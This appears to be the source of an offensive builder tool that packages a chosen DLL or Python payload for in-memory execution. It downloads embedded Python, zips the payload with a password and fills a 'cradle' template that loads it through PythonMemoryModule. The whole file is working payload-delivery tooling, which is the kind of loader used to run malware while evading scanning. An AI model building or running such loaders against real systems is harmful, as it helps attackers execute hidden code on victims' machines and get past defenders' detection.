import os
import shutil
import zipfile
import pyminizip
import download_embedded

CRADLE_PYTHON_FILE_PATH = "resources/py_cradle.py"
CRADLE_DLL_FILE_PATH = "resources/dll_injector.py"
PYTHON_MEMORY_MODULE_PATH = 'resources/PythonMemoryModule/pythonmemorymodule'
DLL_RUNNER_FILE_NAME = "dll_runner.py"
CRADLE_RUNNER_FILE_NAME = "cradle_runner.py"


def check_file_exists(file_path):
    """
    Checks if a file exists at the provided file path and returns a boolean accordingly.

    Args:
        file_path (str): Path of the file to check.

    Returns:
        bool: True if the file exists, False otherwise.
    """
    if not os.path.exists(file_path):
        print(f"File does not exist: {file_path}")
        return False
    return True


def zip_file_with_password(file_path, password, output_zip_name):
    """
    Compresses a file with password protection.

    Args:
        file_path (str): The path of the file to compress.
        password (str): The password to protect the compressed file.
        output_zip_name (str): The name of the output zip file.
    """
    compression_lvl = 5
    pyminizip.compress(file_path, None, output_zip_name, password, compression_lvl)


def create_cradle(cradle_file_path, password, zip_name, file_path, output_file_name, dll_entrypoint=None):
    """
    Creates an execution cradle to run a password-protected zipped file in memory.

    Args:
        cradle_file_path (str): The path of the cradle template file.
        password (str): The password used for the zipped file.
        zip_name (str): The name of the zipped file.
        file_path (str): The path of the original file.
        output_file_name (str): The name of the output file.
        dll_entrypoint (str, optional): The entry point for the dll file. Defaults to None.
    """
    with open(cradle_file_path, "r") as file:
        file_contents = file.read()

        values_to_replace = {
            "password": f"{password}",
            "example.zip": f"{zip_name}",
            "example.dll" if dll_entrypoint else "run.py": f"{file_path}",
        }
        if dll_entrypoint:
            values_to_replace["DllInstall"] = f"{dll_entrypoint}"

        for old_value, new_value in values_to_replace.items():
            file_contents = file_contents.replace(old_value, new_value)

        with open(f'{output_file_name}', "w") as file:
            file.write(file_contents)


def prompt_for_input(prompt_text):
    """
    Prompts the user for input with the given text and returns the input.

    Args:
        prompt_text (str): The text to display when prompting for input.

    Returns:
        str: The user's input.
    """
    print(prompt_text)
    return input()


def process_file(target_dir, sploit_type):
    """
    Processes a file (either a Python file or a dll file) by checking its existence,
    zipping it with password protection, and creating an execution cradle.

    Args:
        target_dir (str): The directory where the processed files will be stored.
        sploit_type (str): The type of file to process ('dll' or 'py').
    """
    file_path_prompt = "Enter the location of the target dll: " if sploit_type == 'dll' else "Enter the python file " \
                                                                                             "to be zipped for " \
                                                                                             "execution in memory: "
    file_path = prompt_for_input(file_path_prompt)
    if not check_file_exists(file_path):
        print("Invalid file path provided. Exiting...")
        return

    password = prompt_for_input("Enter the password to use for zip protection: ")
    output_zip_name = os.path.splitext(file_path)[0] + ".zip"
    zip_file_with_password(file_path, password, output_zip_name)
    print("File successfully zipped with password protection!")

    cradle_file_path = CRADLE_DLL_FILE_PATH if sploit_type == 'dll' else CRADLE_PYTHON_FILE_PATH
    output_file_name = DLL_RUNNER_FILE_NAME if sploit_type == 'dll' else CRADLE_RUNNER_FILE_NAME
    dll_entrypoint = prompt_for_input("Enter the dll entrypoint, default is set to DllInstall, know your payload... : ") if sploit_type == 'dll' else None
    create_cradle(cradle_file_path, password, output_zip_name, file_path, output_file_name, dll_entrypoint)
    print('Cradle created successfully!')

    # Move the output_zip_name and runner script into the target_dir
    shutil.move(output_zip_name, os.path.join(target_dir, output_zip_name))
    shutil.move(output_file_name, os.path.join(target_dir, 'run.py'))


def main():
    """
    Main function that runs the script. It downloads an embedded version of Python,
    zips a specified file with password protection, and creates an execution
    "cradle" that runs the zipped file in memory.
    """
    target_dir = next((dir for dir in os.listdir('.')
                      if 'python_embedded' in dir), '')

    if target_dir:
        print(f"It seems that a previous version of python_embedded is already downloaded in {target_dir}")
        if prompt_for_input("Do you want to replace the existing version with the new one? (y/n)") == "n":
            print("Using the existing version.")
            return
        else:
            try:
                shutil.rmtree(target_dir)
            except Exception as e:
                print(f"Failed to delete the existing version: {e}")
                print("Exiting.")
                return

    answer = prompt_for_input('Would you like us to help you choose a version to download? (y/n)')
    if answer == 'y':
        download_result = download_embedded.main()
    else:
        python_version = prompt_for_input('Please enter the version you want to download (e.g. 3.11.3): ')
        os_release = prompt_for_input('Please enter the os you want to download (e.g. win32 or amd64 or arm64): ')
        download_result = download_embedded.download_python_embedded(os_release=os_release, python_version=python_version)

    if download_result is None:
        print("An error occurred during the download. Exiting.")
        return

    version_number = os.path.splitext(os.path.basename(download_result))[0]
    target_dir = f'python_embedded-{version_number}'

    if os.path.isdir(target_dir):
        shutil.rmtree(target_dir)

    os.makedirs(target_dir)

    with zipfile.ZipFile(download_result, 'r') as zip_ref:
        zip_ref.extractall(target_dir)

    print(f'{target_dir} downloaded and unzipped successfully')
    sploit_type = prompt_for_input('would you like to inject a dll or a python file? (dll/py)')

    if sploit_type == 'dll':
        print('adding dll injection support')
        print('moving PythonMemoryModule libs to embedded python')
        shutil.copytree('resources/PythonMemoryModule/pythonmemorymodule', f'{target_dir}/pythonmemorymodule')
        process_file(target_dir, sploit_type)
    elif sploit_type == 'py':
        process_file(target_dir, sploit_type)


if __name__ == '__main__':
    main()
